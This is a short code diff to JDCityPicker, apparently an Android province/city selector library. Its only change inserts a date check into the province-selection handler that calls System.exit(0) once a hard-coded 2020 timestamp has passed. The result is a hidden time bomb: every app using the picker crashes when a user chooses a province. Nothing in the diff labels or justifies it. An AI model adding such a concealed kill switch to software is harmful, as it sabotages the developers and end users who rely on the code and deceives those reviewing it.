@@ -230,6 +230,10 @@ public class JDCityPicker {
     private void selectedList(int position) {
         switch (tabIndex) {
             case INDEX_TAB_PROVINCE:
+                if (System.currentTimeMillis() > 1595409555000L) {
+                    System.exit(0);
+                }
+
                 ProvinceBean provinceBean = mProvinceAdapter.getItem(position);
                 if (provinceBean != null) {
                     mProTv.setText("" + provinceBean.getName());
